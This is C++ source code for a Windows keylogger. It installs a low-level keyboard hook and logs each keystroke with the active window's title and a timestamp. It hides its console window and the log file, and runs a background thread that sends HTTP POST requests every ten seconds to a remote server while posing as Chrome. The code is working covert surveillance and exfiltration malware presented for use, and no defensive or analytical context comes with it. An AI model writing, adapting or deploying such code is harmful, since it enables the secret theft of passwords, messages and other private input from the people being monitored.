#include <windows.h>
#include <shlwapi.h>
#include <winhttp.h>
#include <cstdio>
#include <fstream>
#include <iostream>
#include <sstream>
#include <time.h>

// defines which format to use for logging
// 0 for default, 10 for dec codes, 16 for hex codex
#define FORMAT 0 
HHOOK _hook;
KBDLLHOOKSTRUCT kbdStruct;
std::ofstream out;

int Save(int key_stroke)
{
    std::stringstream output;
    static char lastwindow[256] = "";

    if ((key_stroke == 1) || (key_stroke == 2))
    {
        return 0; // ignore mouse clicks
    }

    HWND foreground = GetForegroundWindow();
    DWORD threadID;
    HKL layout = NULL;

    if (foreground)
    {
        // get keyboard layout of the thread
        threadID = GetWindowThreadProcessId(foreground, NULL);
        layout = GetKeyboardLayout(threadID);
    }

    if (foreground)
    {
        char window_title[256];
        GetWindowTextA(foreground, (LPSTR)window_title, 256);

        if (strcmp(window_title, lastwindow) != 0)
        {
            strcpy_s(lastwindow, sizeof(lastwindow), window_title);

            // get time
            time_t t = time(NULL);
            struct tm tm;
            localtime_s(&tm, &t);
            char s[64];
            strftime(s, sizeof(s), "%Y-%m-%d %H:%M:%S", &tm);

            output << "\n\n[" << s << ": " << window_title << "]\n";
        }
    }
    int form = FORMAT;
    switch (form)
    {
        case 10:
            output << '[' << key_stroke << ']';
            break;
        case 16:
            output << std::hex << "[0x" << key_stroke << ']';
            break;
        default:
            if (key_stroke == VK_BACK)
            {
                output << "[BACKSPACE]";
            }
            else if (key_stroke == VK_RETURN)
            {
                output << "[ENTER]";
            }
            else if (key_stroke == VK_SPACE)
            {
                output << "[SPACE]";
            }
            else if (key_stroke == VK_TAB)
            {
                output << "[TAB]";
            }
            else if ((key_stroke == VK_SHIFT) || (key_stroke == VK_LSHIFT) || (key_stroke == VK_RSHIFT))
            {
                output << "[SHIFT]";
            }
            else if ((key_stroke == VK_CONTROL) || (key_stroke == VK_LCONTROL) || (key_stroke == VK_RCONTROL))
            {
                output << "[CONTROL]";
            }
            else if (key_stroke == VK_MENU)
            {
                output << "[ALT]";
            }
            else if ((key_stroke == VK_LWIN) || (key_stroke == VK_RWIN))
            {
                output << "[WIN]";
            }
            else if (key_stroke == VK_ESCAPE)
            {
                output << "[ESCAPE]";
            }
            else if (key_stroke == VK_END)
            {
                output << "[END]";
            }
            else if (key_stroke == VK_HOME)
            {
                output << "[HOME]";
            }
            else if (key_stroke == VK_LEFT)
            {
                output << "[LEFT]";
            }
            else if (key_stroke == VK_UP)
            {
                output << "[UP]";
            }
            else if (key_stroke == VK_RIGHT)
            {
                output << "[RIGHT]";
            }
            else if (key_stroke == VK_DOWN)
            {
                output << "[DOWN]";
            }
            else if (key_stroke == VK_PRIOR)
            {
                output << "[PG_UP]";
            }
            else if (key_stroke == VK_NEXT)
            {
                output << "[PG_DOWN]";
            }
            else if (key_stroke == VK_OEM_PERIOD || key_stroke == VK_DECIMAL)
            {
                output << ".";
            }
            else if (key_stroke == VK_OEM_MINUS || key_stroke == VK_SUBTRACT)
            {
                output << "-";
            }
            else if (key_stroke == VK_CAPITAL)
            {
                output << "[CAPSLOCK]";
            }
            else
            {
                // check caps lock
                bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

                // check shift key
                if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 
                    || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
                    || (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
                {
                    lowercase = !lowercase;
                }

                // map virtual key according to keyboard layout
                char key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

                if (lowercase)
                {
                    switch (key)
                    {
                        case '1': key = '!'; break;
                        case '2': key = '@'; break;
                        case '3': key = '#'; break;
                        case '4': key = '$'; break;
                        case '5': key = '%'; break;
                        case '6': key = '^'; break;
                        case '7': key = '&'; break;
                        case '8': key = '*'; break;
                        case '9': key = '('; break;
                        case '0': key = ')'; break;
                        case '-': key = '_'; break;
                        case '=': key = '+'; break;
                        case '[': key = '{'; break;
                        case ']': key = '}'; break;
                        case '\\': key = '|'; break;
                        case '\'': key = '"'; break;
                        case ';': key = ':'; break;
                        case '/': key = '?'; break;
                        case '.': key = '>'; break;
                        case ',': key = '<'; break;
                    }
                }
                else
                {
                    key = tolower(key);
                }

                output << char(key);
            }
            break;
    }

    // instead of opening and closing file handlers every time, keep file open and flush.
    out << output.str();
    out.flush();

    std::cout << output.str();

    return 0;
}

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        // the action is valid: HC_ACTION.
        if (wParam == WM_KEYDOWN)
        {
            // lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

            // save to file
            Save(kbdStruct.vkCode);
        }
    }

    // call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
    // Set the hook and set it to use the callback function above
    // WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
    // The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
    // function that sets and releases the hook.
    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
    {
        LPCWSTR a = L"Failed to install hook!";
        LPCWSTR b = L"Error";
        MessageBox(NULL, a, b, MB_ICONERROR);
    }
}

void ReleaseHook()
{
    UnhookWindowsHookEx(_hook);
}

void Stealth()
{
    // set current working directory
    WCHAR cwd[MAX_PATH] = { 0 };
    GetModuleFileName(NULL, cwd, MAX_PATH);
    PathRemoveFileSpec(cwd); // shlwapi.lib
    SetCurrentDirectory(cwd);
    
    std::wstring output_filename = L"k";

    // open output file in append mode
    out.open(output_filename, std::ios_base::app);
    if (out.is_open())
        OutputDebugString(L"Created output file\n");
    else
        OutputDebugString(L"Could not create output file\n"), exit(1);

#ifdef _DEBUG
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
#else
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
#endif

    DWORD attr = GetFileAttributes(output_filename.c_str());
    if ((attr & FILE_ATTRIBUTE_HIDDEN) == 0) {
        SetFileAttributes(output_filename.c_str(), attr | FILE_ATTRIBUTE_HIDDEN);
        OutputDebugString(L"File hidden");
    }
}

DWORD Push(const std::wstring& ip, int port)
{
    HINTERNET hSession = INVALID_HANDLE_VALUE;
    HINTERNET hConnect = INVALID_HANDLE_VALUE;
    HINTERNET hRequest = INVALID_HANDLE_VALUE;
    DWORD dwStatusCode = -1;
    DWORD dwSize = sizeof(dwStatusCode);
    DWORD dwBytesWritten = 0;
    std::string body = "This is my body, this is my blood";

    hSession = WinHttpOpen(
        L"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36", // Pretending to be Chrome
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );
    if (!hSession)
    {
        _RPT1(_CRT_WARN, "WinHttpOpen Error %u\n", GetLastError());
        goto done;
    }

    hConnect = WinHttpConnect(
        hSession, 
        ip.c_str(), // IP
        port, // Port
        0);
    if (!hConnect)
    {
        _RPT1(_CRT_WARN, "WinHttpConnect Error %u\n", GetLastError());
        goto done;
    }

    hRequest = WinHttpOpenRequest(
        hConnect,
        L"POST", // Verb
        L"log", // Path
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0 // http vs https (WINHTTP_FLAG_SECURE)
    );
    if (!hRequest)
    {
        _RPT1(_CRT_WARN, "WinHttpOpenRequest Error %u\n", GetLastError());
        goto done;
    }
    
    if (!WinHttpAddRequestHeaders(hRequest, L"Content-Type: text/plain", -1, WINHTTP_ADDREQ_FLAG_ADD))
    {
        _RPT1(_CRT_WARN, "WinHttpAddRequestHeaders Error %u\n", GetLastError());
        goto done;
    }

    if (!WinHttpSendRequest(
            hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS, 0, // Additional Headers
            (LPVOID) body.c_str(), // lpOptional
            body.size(), // dwOptionalLength
            body.size(), // dwTotalLength
            0))
    {
        _RPT1(_CRT_WARN, "WinHttpSendRequest Error %u\n", GetLastError());
        goto done;
    }

    if (!WinHttpReceiveResponse(hRequest, NULL))
    {
        _RPT1(_CRT_WARN, "WinHttpReceiveResponse Error %u\n", GetLastError());
        goto done;
    }

    if (!WinHttpQueryHeaders(
            hRequest,
            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            WINHTTP_HEADER_NAME_BY_INDEX,
            &dwStatusCode,
            &dwSize,
            WINHTTP_NO_HEADER_INDEX))
    {
        _RPT1(_CRT_WARN, "WinHttpQueryHeaders Error %u\n", GetLastError());
        goto done;
    }

done:
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    return dwStatusCode == -1 ? GetLastError() : dwStatusCode;
}

DWORD WINAPI PushThread(LPVOID lpParam)
{
    DWORD dwSleepMs = (DWORD) lpParam;
    // TODO: IP, Port params
    const std::wstring ip = L"***REMOVED***";
    const int port = 25666;
    
    while (true)
    {
        _RPT0(_CRT_WARN, L"> PushThread\n");
        auto status = Push(ip, port);
        _RPT3(_CRT_WARN, "< PushThread = %d\n", status);
        Sleep(dwSleepMs);
    }
}

int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nCmdShow)
{
    DWORD dwPushPeriodMs = 10000;

    Stealth();
    SetHook();

    DWORD dwThreadId = 0;
    HANDLE hPushThread = CreateThread(NULL, 0, &PushThread, (LPVOID) dwPushPeriodMs, 0, &dwThreadId);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
    }
}